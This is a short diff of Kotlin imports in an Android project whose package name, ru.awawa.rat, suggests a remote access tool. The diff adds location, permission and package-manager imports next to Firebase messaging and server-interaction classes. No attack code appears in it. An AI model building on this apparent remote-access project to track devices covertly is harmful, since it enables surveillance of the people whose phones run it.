@@ -1,11 +1,16 @@
 package ru.awawa.rat
 
+import android.Manifest
 import android.app.AlarmManager
 import android.app.Application
 import android.app.PendingIntent
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.location.LocationListener
+import android.location.LocationManager
 import android.os.SystemClock
+import androidx.core.app.ActivityCompat
 import com.google.firebase.messaging.FirebaseMessaging
 import ru.awawa.rat.helper.Preferences
 import ru.awawa.rat.server.Interactor
